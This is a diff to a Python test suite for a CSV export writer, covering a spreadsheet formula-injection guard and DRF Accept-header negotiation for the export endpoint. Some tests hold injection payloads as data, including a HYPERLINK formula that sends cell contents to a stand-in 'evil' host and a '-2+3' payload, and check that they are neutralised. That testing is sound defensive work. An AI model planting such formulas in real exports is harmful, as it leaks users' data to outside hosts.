@@ -21,6 +21,7 @@ deliberately not a dependency.
 import csv
 import io
 import json
+from datetime import datetime
 from decimal import Decimal
 from uuid import uuid4
 
@@ -142,12 +143,54 @@ class TestCsvWriterParity:
         assert csv_cell(Decimal("19.99")) == "19.99"
 
     def test_formula_guard_covers_text_but_not_numbers(self):
-        assert csv_cell("=HYPERLINK(\"http://evil/\"+A1)").startswith("'=")
         assert csv_cell("+cmd") == "'+cmd"
         assert csv_cell("@SUM(A1)") == "'@SUM(A1)"
-        assert csv_cell("-5") == "'-5"
         assert csv_cell(Decimal("-5.00")) == "-5.00"  # a number is a number
         assert csv_cell("normal - dash") == "normal - dash"
+
+    def test_guard_is_by_shape_not_python_type(self):
+        """`=HYPERLINK(...)` is text, an apostrophe-neutralised cell.
+
+        The type-based rule alone is not enough: DRF answers a DecimalField with
+        the STRING "19.99", so the same data reaches layer 1 (client, sees a
+        string) and layer 2 (server, sees a Decimal) as different Python/JS
+        types. Byte-identity therefore hangs on the SHAPE of the text, and a
+        numeric-shaped string must stay bare on both sides or every negative
+        price in a customer export would differ between the two buttons.
+        """
+        assert csv_cell("=HYPERLINK(\"http://evil/\"+A1)").startswith("'=")
+        assert csv_cell("-5.00") == "-5.00"  # DRF's decimal, as a string
+        assert csv_cell("+19.99") == "+19.99"
+        assert csv_cell("-.5") == "-.5"
+        assert csv_cell("-7,25") == "'-7,25"  # a comma is not a number
+        assert csv_cell("-2+3") == "'-2+3"  # the classic payload
+        assert csv_cell("-IF(1,2,3)") == "'-IF(1,2,3)"
+        assert csv_cell("-") == "'-"  # a lone lead character is not a number
+
+    def test_the_shared_golden_document(self):
+        """One document, asserted twice: here and in csv.test.ts.
+
+        Values were chosen to force every quoting/guard branch at once (int,
+        padded-free text, comma text, embedded quote, embedded newline, bool,
+        NULL, positive and negative Decimal, numeric-shaped STRING, formula
+        payload, datetime as object and as text). The literal below was produced
+        by this writer and is reproduced byte for byte by buildCsv(); if either
+        side drifts, exactly one of the two suites goes red and names the layer.
+        """
+        header = ["id", "name", "notes", "active", "total", "when"]
+        rows = [
+            [1, "Widget", "plain", True, Decimal("19.99"), datetime(2026, 10, 20, 21, 0)],
+            [2, "Gizmo, big", 'say "hi"', False, Decimal("-5.00"), None],
+            [3, "line1\nline2", '=HYPERLINK("http://evil/"+A1)', True, "-7.25",
+             "2026-10-20T21:00:00"],
+        ]
+        assert csv_text([header] + [[csv_cell(v) for v in row] for row in rows]) == (
+            "id,name,notes,active,total,when\r\n"
+            "1,Widget,plain,true,19.99,2026-10-20T21:00:00\r\n"
+            '2,"Gizmo, big","say ""hi""",false,-5.00,\r\n'
+            "3,\"line1\nline2\",\"'=HYPERLINK(\"\"http://evil/\"\"+A1)\","
+            "true,-7.25,2026-10-20T21:00:00\r\n"
+        )
 
 
 # ---------------------------------------------------------------------------
@@ -160,6 +203,44 @@ class TestExportEndpointBasics:
 
     def test_unauthenticated_is_rejected(self, api, db):
         assert api.get(export_url()).status_code == 401
+
+    def test_accept_text_csv_is_negotiable(self, auth_api, db):
+        """The header the SHIPPED thin client sends must not 406.
+
+        DRF negotiates in ``initialize_request()`` — before the view body runs —
+        so an action that returns a plain ``HttpResponse`` still needs a renderer
+        class whose ``media_type`` matches the request. With the default
+        ``JSONRenderer``/``BrowsableAPIRenderer`` pair, ``Accept: text/csv``
+        raised ``NotAcceptable``: measured on the live demo rig, and invisible to
+        every APIClient test above because APIClient sends ``Accept: */*``.
+        """
+        response = auth_api.get(export_url(), HTTP_ACCEPT="text/csv")
+        assert response.status_code == 200, response.content[:200]
+        assert response["Content-Type"] == "text/csv; charset=utf-8"
+
+    def test_accept_with_quality_fallback_negotiates_the_csv_renderer(self, auth_api, db):
+        """``text/csv, */*;q=0.8`` (the client's real header, widened so a
+        customer backend that forgot the renderer still answers) must prefer the
+        exact match rather than falling through to JSON."""
+        response = auth_api.get(export_url(), HTTP_ACCEPT="text/csv, */*;q=0.8")
+        assert response.status_code == 200
+        assert response["Content-Type"] == "text/csv; charset=utf-8"
+
+    def test_a_browser_address_bar_hit_still_downloads(self, auth_api, db):
+        # Regression guard for the fix above: adding a renderer class overrides
+        # the viewset default pair, and dropping the browser-only one would turn
+        # a manual download into a 406 for every human who pastes the URL.
+        response = auth_api.get(
+            export_url(),
+            HTTP_ACCEPT="text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        )
+        assert response.status_code == 200
+        assert response["Content-Type"] == "text/csv; charset=utf-8"
+
+    def test_an_unnegotiable_accept_is_still_refused(self, auth_api, db):
+        # The guard is not being widened into "answer anything": a PDF request
+        # is a client that cannot read this endpoint's body.
+        assert auth_api.get(export_url(), HTTP_ACCEPT="application/pdf").status_code == 406
 
     def test_answers_a_csv_attachment_with_a_bom(self, auth_api, db):
         make_order(notes="first")
